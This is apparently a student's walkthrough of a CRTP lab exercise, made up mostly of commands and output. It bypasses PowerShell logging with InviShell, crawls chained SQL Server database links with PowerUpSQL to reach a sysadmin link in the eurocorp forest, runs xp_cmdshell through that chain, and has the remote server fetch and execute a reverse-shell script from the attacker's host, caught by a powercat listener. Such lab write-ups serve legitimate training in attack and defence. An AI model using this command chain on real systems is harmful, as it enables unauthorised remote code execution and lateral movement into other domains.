# CRTP: Hands-On 22

```
  • Get a reverse shell on a SQL server in eurocorp forest by abusing database links from dcorp-mssql.
```

## SQL server reverse shell

Open cmd and import PowerUPSQL:
```
Microsoft Windows [Version 10.0.20348.1249]
(c) Microsoft Corporation. All rights reserved.

C:\Users\student162>C:\AD\Tools\InviShell\RunWithRegistryNonAdmin.bat

C:\Users\student162>set COR_ENABLE_PROFILING=1

C:\Users\student162>set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

C:\Users\student162>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
The operation completed successfully.

C:\Users\student162>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
The operation completed successfully.

C:\Users\student162>REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "C:\AD\Tools\InviShell\InShellProf.dll" /f
The operation completed successfully.

C:\Users\student162>powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows

PS C:\Users\student162> Import-Module C:\AD\Tools\PowerUpSQL-master\PowerUpSQL.ps1

```
Review Domain Instances:

```
PS C:\Users\student162> Get-SQLInstanceDomain


ComputerName     : dcorp-mgmt.dollarcorp.moneycorp.local
Instance         : dcorp-mgmt.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123394400
DomainAccount    : svcadmin
DomainAccountCn  : svc admin
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local:1433
LastLogon        : 5/3/2023 12:22 AM
Description      : Account to be used for services which need high privileges.

ComputerName     : dcorp-mgmt.dollarcorp.moneycorp.local
Instance         : dcorp-mgmt.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123394400
DomainAccount    : svcadmin
DomainAccountCn  : svc admin
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mgmt.dollarcorp.moneycorp.local
LastLogon        : 5/3/2023 12:22 AM
Description      : Account to be used for services which need high privileges.

ComputerName     : dcorp-mssql.dollarcorp.moneycorp.local
Instance         : dcorp-mssql.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123385400
DomainAccount    : DCORP-MSSQL$
DomainAccountCn  : DCORP-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local:1433
LastLogon        : 5/3/2023 1:35 AM
Description      :

ComputerName     : dcorp-mssql.dollarcorp.moneycorp.local
Instance         : dcorp-mssql.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123385400
DomainAccount    : DCORP-MSSQL$
DomainAccountCn  : DCORP-MSSQL
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-mssql.dollarcorp.moneycorp.local
LastLogon        : 5/3/2023 1:35 AM
Description      :

ComputerName     : dcorp-sql1.dollarcorp.moneycorp.local
Instance         : dcorp-sql1.dollarcorp.moneycorp.local,1433
DomainAccountSid : 15000005210001391322314218022427222724713123386400
DomainAccount    : DCORP-SQL1$
DomainAccountCn  : DCORP-SQL1
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-sql1.dollarcorp.moneycorp.local:1433
LastLogon        : 5/3/2023 1:35 AM
Description      :

ComputerName     : dcorp-sql1.dollarcorp.moneycorp.local
Instance         : dcorp-sql1.dollarcorp.moneycorp.local
DomainAccountSid : 15000005210001391322314218022427222724713123386400
DomainAccount    : DCORP-SQL1$
DomainAccountCn  : DCORP-SQL1
Service          : MSSQLSvc
Spn              : MSSQLSvc/dcorp-sql1.dollarcorp.moneycorp.local
LastLogon        : 5/3/2023 1:35 AM
Description      :
```
Review server info:

```
PS C:\Users\student162> Get-SQLInstanceDomain | Get-SQLServerInfo


ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1820
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student162
IsSysadmin             : No
ActiveSessions         : 1

ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
Instance               : DCORP-MSSQL
DomainName             : dcorp
ServiceProcessID       : 1820
ServiceName            : MSSQLSERVER
ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
AuthenticationMode     : Windows and SQL Server Authentication
ForcedEncryption       : 0
Clustered              : No
SQLServerVersionNumber : 15.0.2000.5
SQLServerMajorVersion  : 2019
SQLServerEdition       : Developer Edition (64-bit)
SQLServerServicePack   : RTM
OSArchitecture         : X64
OsVersionNumber        : SQL
Currentlogin           : dcorp\student162
IsSysadmin             : No
ActiveSessions         : 1


```
Review server links:

```
PS C:\Users\student162> Get-SQLServerLinkCrawl -Verbose -Instance DCORP-MSSQL
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\student162
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: EU-SQL.EU.EUROCORP.LOCAL
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: EU-SQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL.EU.EUROCORP.LOCAL
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:


Version     : SQL Server 2019
Instance    : DCORP-MSSQL
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL}
User        : dcorp\student162
Links       : {DCORP-SQL1}

Version     : SQL Server 2019
Instance    : DCORP-SQL1
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1}
User        : dblinkuser
Links       : {DCORP-MGMT}

Version     : SQL Server 2019
Instance    : DCORP-MGMT
CustomQuery :
Sysadmin    : 0
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
User        : sqluser
Links       : {EU-SQL.EU.EUROCORP.LOCAL}

Version     : SQL Server 2019
Instance    : EU-SQL
CustomQuery :
Sysadmin    : 1
Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
User        : sa
Links       :


```

Execute remote commands:

```
PS C:\Users\student162> Get-SQLServerLinkCrawl -Verbose -Instance DCORP-MSSQL -Query "exec master..xp_cmdshell 'whoami'" | select -ExpandProperty Customquery
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\student162
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: EU-SQL.EU.EUROCORP.LOCAL
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: --------------------------------
VERBOSE:  Server: EU-SQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL.EU.EUROCORP.LOCAL
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:
nt authority\network service

```

Spawnd reverse shell with two services listen at local:
- 80 HFS for sharing TCPReverseshell (ps1)
- powercat at 443 (recieve session)


```
PS C:\Users\student162> Get-SQLServerLinkCrawl -Verbose -Instance DCORP-MSSQL -Query "exec master..xp_cmdshell 'powershell IEX (New-Object Net.webclient).DownloadString(''http://172.16.100.162/Invoke-PowerShellTcp.ps1'')'" | select -ExpandProperty Customquery
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MSSQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL
VERBOSE:  - Link Login: dcorp\student162
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-SQL1
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-SQL1
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1
VERBOSE:  - Link Login: dblinkuser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: DCORP-MGMT
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: DCORP-MGMT
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT
VERBOSE:  - Link Login: sqluser
VERBOSE:  - Link IsSysAdmin: 0
VERBOSE:  - Link Count: 1
VERBOSE:  - Links on this server: EU-SQL.EU.EUROCORP.LOCAL
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Success.
VERBOSE: DCORP-MSSQL : Connection Failed.
VERBOSE: --------------------------------
VERBOSE:  Server: EU-SQL
VERBOSE: --------------------------------
VERBOSE:  - Link Path to server: DCORP-MSSQL -> DCORP-SQL1 -> DCORP-MGMT -> EU-SQL.EU.EUROCORP.LOCAL
VERBOSE:  - Link Login: sa
VERBOSE:  - Link IsSysAdmin: 1
VERBOSE:  - Link Count: 0
VERBOSE:  - Links on this server:
```

```
PS C:\Users\student162> Import-Module C:\AD\Tools\powercat.ps1
PS C:\Users\student162> powercat -l -p 443 -v
VERBOSE: Set Stream 1: TCP
VERBOSE: Set Stream 2: Console
VERBOSE: Setting up Stream 1...
VERBOSE: Listening on [0.0.0.0] (port 443)
VERBOSE: Connection from [172.16.15.17] port  [tcp] accepted (source port 61033)
VERBOSE: Setting up Stream 2...
VERBOSE: Both Communication Streams Established. Redirecting Data Between Streams...
Windows PowerShell running as user EU-SQL$ on EU-SQL
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\Windows\system32>whoami
nt authority\network service
PS C:\Windows\system32> hostname
eu-sql
PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::e1db:eb71:ac20:a102%5
   IPv4 Address. . . . . . . . . . . : 172.16.15.17
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 172.16.15.254
PS C:\Windows\system32>
```
